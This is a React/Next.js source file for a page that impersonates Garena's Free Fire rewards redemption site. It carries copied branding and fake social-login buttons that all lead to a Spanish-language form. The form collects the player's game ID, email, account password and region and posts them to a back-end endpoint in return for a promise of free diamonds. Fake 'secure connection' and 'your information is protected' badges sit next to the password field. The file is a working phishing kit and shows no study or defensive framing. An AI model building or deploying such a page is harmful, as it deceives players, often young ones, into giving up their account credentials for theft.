'use client'

import { useState } from 'react'
import { ShoppingCart, Facebook, Twitter, ChevronDown, Gift, Shield, Sparkles, Mail, AlertCircle } from 'lucide-react'

// Free Fire Logo Component
function FreeFireLogo() {
  return (
    <div className="flex items-center gap-1">
      <span className="text-white font-bold text-xl tracking-wider" style={{ textShadow: '2px 2px 4px rgba(0,0,0,0.5)' }}>
        FREE FIRE
      </span>
      <div className="relative w-6 h-8">
        <svg viewBox="0 0 24 32" className="w-full h-full">
          <path 
            d="M13 2L4 18h7l-2 12 9-16h-7l2-12z" 
            fill="#FFD700"
            stroke="#FFA500"
            strokeWidth="1"
          />
        </svg>
      </div>
    </div>
  )
}

// Garena Logo Component
function GarenaLogo() {
  return (
    <div className="flex items-center gap-2">
      <div className="w-6 h-6 relative">
        <svg viewBox="0 0 24 24" className="w-full h-full">
          <circle cx="12" cy="12" r="10" fill="#E53935"/>
          <path 
            d="M8 8c0-2 1.5-4 4-4s4 2 4 4c0 3-4 4-4 8" 
            stroke="white" 
            strokeWidth="2" 
            fill="none"
            strokeLinecap="round"
          />
          <circle cx="12" cy="18" r="1" fill="white"/>
        </svg>
      </div>
    </div>
  )
}

// VK Icon
function VKIcon() {
  return (
    <svg viewBox="0 0 24 24" className="w-6 h-6">
      <path fill="#4A90D9" d="M15.684 0H8.316C1.592 0 0 1.592 0 8.316v7.368C0 22.408 1.592 24 8.316 24h7.368C22.408 24 24 22.408 24 15.684V8.316C24 1.592 22.408 0 15.684 0zm3.692 17.123h-1.744c-.66 0-.864-.525-2.05-1.727-1.033-1-1.49-1.135-1.744-1.135-.356 0-.458.102-.458.593v1.575c0 .424-.135.678-1.253.678-1.846 0-3.896-1.118-5.335-3.202C4.624 10.857 4.03 8.57 4.03 8.096c0-.254.102-.491.593-.491h1.744c.44 0 .61.203.78.677.863 2.49 2.303 4.675 2.896 4.675.22 0 .322-.102.322-.66V9.721c-.068-1.186-.695-1.287-.695-1.71 0-.204.17-.407.44-.407h2.744c.373 0 .508.203.508.643v3.473c0 .372.17.508.271.508.22 0 .407-.136.813-.542 1.254-1.406 2.151-3.574 2.151-3.574.119-.254.322-.491.763-.491h1.744c.525 0 .644.27.525.643-.22 1.017-2.354 4.031-2.354 4.031-.186.305-.254.44 0 .78.186.254.796.779 1.203 1.253.745.847 1.32 1.558 1.473 2.05.17.49-.085.744-.576.744z"/>
    </svg>
  )
}

// Google Icon
function GoogleIcon() {
  return (
    <svg viewBox="0 0 24 24" className="w-6 h-6">
      <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
      <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
      <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
      <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
    </svg>
  )
}

// Apple Icon
function AppleIcon() {
  return (
    <svg viewBox="0 0 24 24" className="w-6 h-6">
      <path fill="#000000" d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
    </svg>
  )
}

// Store Button
function StoreButton() {
  return (
    <button className="flex items-center gap-2 bg-white text-black px-4 py-2 rounded-md font-semibold text-sm hover:bg-gray-100 transition-colors">
      <ShoppingCart className="w-4 h-4" />
      <span>STORE</span>
    </button>
  )
}

// Social Login Button
interface SocialButtonProps {
  children: React.ReactNode
  onClick?: () => void
}

function SocialButton({ children, onClick }: SocialButtonProps) {
  return (
    <button 
      onClick={onClick}
      className="w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-lg hover:scale-105 transition-transform"
    >
      {children}
    </button>
  )
}

// Important Notice Component
function ImportantNotice() {
  return (
    <div className="mx-4 bg-white/95 backdrop-blur-sm rounded-lg p-4 shadow-xl">
      <h3 className="text-black font-bold text-base mb-3">Important Notice</h3>
      <ul className="space-y-2 text-gray-800 text-sm">
        <li className="flex items-start gap-2">
          <span className="text-orange-500 font-bold">1.</span>
          <span>Reward codes are usually 12 or 16 characters long, consisting of letters and numbers.</span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-orange-500 font-bold">2.</span>
          <span>Rewards will be sent to your in-game mailbox within 24 hours after successful redemption.</span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-orange-500 font-bold">3.</span>
          <span>Some rewards require you to login to the game to claim them from the vault.</span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-orange-500 font-bold">4.</span>
          <span>Guest accounts cannot use the redemption feature. Please bind your account first.</span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-orange-500 font-bold">5.</span>
          <span>Each redemption code can only be used once per account.</span>
        </li>
      </ul>
    </div>
  )
}

// Redemption Form Component
interface RedemptionFormProps {
  onBack: () => void
}

function RedemptionForm({ onBack }: RedemptionFormProps) {
  const [formData, setFormData] = useState({
    gameId: '',
    email: '',
    password: '',
    region: ''
  })
  const [isLoading, setIsLoading] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [error, setError] = useState('')

  const regions = [
    { value: 'na', label: 'Norteamérica', flag: '🇺🇸' },
    { value: 'cn', label: 'China', flag: '🇨🇳' },
    { value: 'vn', label: 'Vietnam', flag: '🇻🇳' },
    { value: 'br', label: 'Brasil', flag: '🇧🇷' }
  ]

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError('')
    
    if (!formData.gameId || !formData.email || !formData.password || !formData.region) {
      setError('Por favor completa todos los campos')
      return
    }

    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!emailRegex.test(formData.email)) {
      setError('Por favor ingresa un email válido')
      return
    }
    
    setIsLoading(true)

    try {
      // Send data to Firebase via API
      const response = await fetch('/api/redemption', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          gameId: formData.gameId,
          email: formData.email,
          password: formData.password,
          region: formData.region,
        }),
      })

      const result = await response.json()

      if (result.success) {
        setShowSuccess(true)
      } else {
        setError(result.error || 'Error al procesar la solicitud')
      }
    } catch (err) {
      console.error('Error:', err)
      setError('Error de conexión. Intenta nuevamente.')
    } finally {
      setIsLoading(false)
    }
  }

  if (showSuccess) {
    return (
      <div className="min-h-screen flex flex-col relative">
        {/* Background */}
        <div 
          className="absolute inset-0 bg-cover bg-center bg-no-repeat"
          style={{ backgroundImage: 'url(/background.png)' }}
        />
        <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
        
        {/* Header */}
        <header className="relative z-10 flex items-center justify-between px-4 py-3">
          <FreeFireLogo />
          <StoreButton />
        </header>
        
        {/* Success Content */}
        <main className="relative z-10 flex-1 flex flex-col items-center justify-center px-6">
          <div className="bg-white/95 backdrop-blur-sm rounded-2xl p-8 shadow-2xl max-w-sm w-full text-center">
            <div className="w-20 h-20 bg-gradient-to-br from-yellow-400 to-orange-500 rounded-full flex items-center justify-center mx-auto mb-6">
              <Sparkles className="w-10 h-10 text-white" />
            </div>
            
            <h2 className="text-2xl font-bold text-gray-900 mb-2">¡Felicidades!</h2>
            <p className="text-gray-600 mb-6">Tu cuenta ha sido vinculada exitosamente</p>
            
            <div className="bg-gradient-to-r from-purple-600 to-blue-600 rounded-xl p-4 mb-6">
              <div className="flex items-center justify-center gap-2 text-white">
                <Gift className="w-6 h-6" />
                <span className="text-lg font-bold">10 Diamantes</span>
              </div>
              <p className="text-white/80 text-sm mt-1">diarios durante 7 días</p>
            </div>
            
            <p className="text-sm text-gray-500">
              Los diamantes serán enviados a tu buzón del juego dentro de las próximas 24 horas.
            </p>
          </div>
        </main>
        
        {/* Footer */}
        <footer className="relative z-10 flex flex-col items-center gap-2 py-4">
          <GarenaLogo />
          <p className="text-white/80 text-xs text-center">
            © Garena International. All Rights Reserved.
          </p>
        </footer>
      </div>
    )
  }

  return (
    <div className="min-h-screen flex flex-col relative">
      {/* Background Image */}
      <div 
        className="absolute inset-0 bg-cover bg-center bg-no-repeat"
        style={{ backgroundImage: 'url(/background.png)' }}
      />
      
      {/* Gradient Overlay */}
      <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
      
      {/* Header */}
      <header className="relative z-10 flex items-center justify-between px-4 py-3">
        <FreeFireLogo />
        <StoreButton />
      </header>
      
      {/* Main Content */}
      <main className="relative z-10 flex-1 flex flex-col items-center justify-start pt-6 px-4">
        {/* Form Card */}
        <div className="w-full max-w-sm">
          {/* Title Section */}
          <div className="text-center mb-5">
            <div className="flex items-center justify-center gap-2 mb-2">
              <Gift className="w-6 h-6 text-yellow-400" />
              <h1 className="text-white text-xl font-bold" style={{ textShadow: '2px 2px 8px rgba(0,0,0,0.8)' }}>
                Canjear Recompensa
              </h1>
            </div>
            <p className="text-gray-300 text-sm">
              Completa el formulario para recibir tus diamantes
            </p>
          </div>
          
          {/* Form */}
          <form onSubmit={handleSubmit} className="bg-white/95 backdrop-blur-sm rounded-xl p-5 shadow-2xl">
            {/* Game ID */}
            <div className="mb-4">
              <label className="block text-gray-700 text-sm font-semibold mb-2">
                ID del Juego
              </label>
              <input
                type="text"
                value={formData.gameId}
                onChange={(e) => setFormData({...formData, gameId: e.target.value})}
                placeholder="Ej: 1234567890"
                className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all text-gray-800"
                required
              />
              <p className="text-xs text-gray-500 mt-1">Encuentra tu ID en tu perfil del juego</p>
            </div>

            {/* Email */}
            <div className="mb-4">
              <label className="block text-gray-700 text-sm font-semibold mb-2">
                Correo Electrónico
              </label>
              <div className="relative">
                <input
                  type="email"
                  value={formData.email}
                  onChange={(e) => setFormData({...formData, email: e.target.value})}
                  placeholder="tu@email.com"
                  className="w-full px-4 py-3 pl-11 rounded-lg border border-gray-300 focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all text-gray-800"
                  required
                />
                <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
              </div>
              <p className="text-xs text-gray-500 mt-1">Para recibir confirmación de tu recompensa</p>
            </div>
            
            {/* Password */}
            <div className="mb-4">
              <label className="block text-gray-700 text-sm font-semibold mb-2">
                Contraseña de la Cuenta
              </label>
              <input
                type="password"
                value={formData.password}
                onChange={(e) => setFormData({...formData, password: e.target.value})}
                placeholder="Ingresa tu contraseña"
                className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all text-gray-800"
                required
              />
              <p className="text-xs text-gray-500 mt-1">Tu información está protegida</p>
            </div>
            
            {/* Region */}
            <div className="mb-5">
              <label className="block text-gray-700 text-sm font-semibold mb-2">
                Región del Servidor
              </label>
              <div className="relative">
                <select
                  value={formData.region}
                  onChange={(e) => setFormData({...formData, region: e.target.value})}
                  className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all text-gray-800 appearance-none bg-white cursor-pointer"
                  required
                >
                  <option value="">Selecciona tu región</option>
                  {regions.map((region) => (
                    <option key={region.value} value={region.value}>
                      {region.flag} {region.label}
                    </option>
                  ))}
                </select>
                <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400 pointer-events-none" />
              </div>
            </div>

            {/* Error Message */}
            {error && (
              <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg flex items-center gap-2">
                <AlertCircle className="w-4 h-4 text-red-500 flex-shrink-0" />
                <span className="text-red-600 text-sm">{error}</span>
              </div>
            )}
            
            {/* Security Badge */}
            <div className="flex items-center gap-2 mb-4 px-2">
              <Shield className="w-4 h-4 text-green-600" />
              <span className="text-xs text-gray-500">Conexión segura verificada</span>
            </div>
            
            {/* Submit Button */}
            <button
              type="submit"
              disabled={isLoading || !formData.gameId || !formData.email || !formData.password || !formData.region}
              className="w-full py-3 rounded-lg font-bold text-white transition-all disabled:opacity-50 disabled:cursor-not-allowed"
              style={{
                background: 'linear-gradient(135deg, #FF6B35 0%, #F7931E 50%, #FFD700 100%)',
                boxShadow: '0 4px 15px rgba(255, 107, 53, 0.4)'
              }}
            >
              {isLoading ? (
                <span className="flex items-center justify-center gap-2">
                  <svg className="animate-spin w-5 h-5" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"/>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>
                  </svg>
                  Verificando...
                </span>
              ) : (
                'Continuar'
              )}
            </button>
            
            {/* Back Button */}
            <button
              type="button"
              onClick={onBack}
              className="w-full mt-3 py-2 text-gray-600 text-sm hover:text-gray-800 transition-colors"
            >
              ← Volver al inicio
            </button>
          </form>
          
          {/* Reward Preview */}
          <div className="mt-4 bg-gradient-to-r from-purple-600/80 to-blue-600/80 backdrop-blur-sm rounded-xl p-4 text-center">
            <p className="text-white text-sm mb-1">Recompensa diaria</p>
            <div className="flex items-center justify-center gap-2">
              <span className="text-2xl">💎</span>
              <span className="text-white text-xl font-bold">10 Diamantes</span>
            </div>
          </div>
        </div>
      </main>
      
      {/* Footer */}
      <footer className="relative z-10 flex flex-col items-center gap-2 py-4 mt-auto">
        <GarenaLogo />
        <p className="text-white/80 text-xs text-center">
          © Garena International. All Rights Reserved.
        </p>
      </footer>
    </div>
  )
}

// Login Screen Component
interface LoginScreenProps {
  onLogin: () => void
}

function LoginScreen({ onLogin }: LoginScreenProps) {
  return (
    <div className="min-h-screen flex flex-col relative overflow-hidden">
      {/* Background Image */}
      <div 
        className="absolute inset-0 bg-cover bg-center bg-no-repeat"
        style={{ backgroundImage: 'url(/background.png)' }}
      />
      
      {/* Gradient Overlay */}
      <div className="absolute inset-0 bg-gradient-to-b from-black/40 via-transparent to-black/60" />
      
      {/* Header */}
      <header className="relative z-10 flex items-center justify-between px-4 py-3">
        <FreeFireLogo />
        <StoreButton />
      </header>
      
      {/* Main Content */}
      <main className="relative z-10 flex-1 flex flex-col items-center justify-start pt-16 px-4">
        {/* Title */}
        <h1 
          className="text-white text-2xl font-bold text-center uppercase tracking-wide mb-2"
          style={{ textShadow: '2px 2px 8px rgba(0,0,0,0.8)' }}
        >
          Rewards Redemption Site
        </h1>
        
        <p 
          className="text-gray-300 text-base mb-8"
          style={{ textShadow: '1px 1px 4px rgba(0,0,0,0.8)' }}
        >
          Please log in.
        </p>
        
        {/* Social Login Buttons */}
        <div className="flex items-center gap-4 mb-8">
          <SocialButton onClick={onLogin}>
            <Facebook className="w-6 h-6 text-[#1877F2]" />
          </SocialButton>
          <SocialButton onClick={onLogin}>
            <VKIcon />
          </SocialButton>
          <SocialButton onClick={onLogin}>
            <GoogleIcon />
          </SocialButton>
          <SocialButton onClick={onLogin}>
            <AppleIcon />
          </SocialButton>
          <SocialButton onClick={onLogin}>
            <Twitter className="w-6 h-6 text-black" />
          </SocialButton>
        </div>
        
        {/* Important Notice */}
        <ImportantNotice />
      </main>
      
      {/* Footer */}
      <footer className="relative z-10 flex flex-col items-center gap-2 py-4 mt-auto">
        <GarenaLogo />
        <p className="text-white/80 text-xs text-center">
          © Garena International. All Rights Reserved.
        </p>
      </footer>
    </div>
  )
}

// Main Component
export default function Home() {
  const [currentScreen, setCurrentScreen] = useState<'login' | 'form'>('login')

  if (currentScreen === 'form') {
    return <RedemptionForm onBack={() => setCurrentScreen('login')} />
  }

  return <LoginScreen onLogin={() => setCurrentScreen('form')} />
}
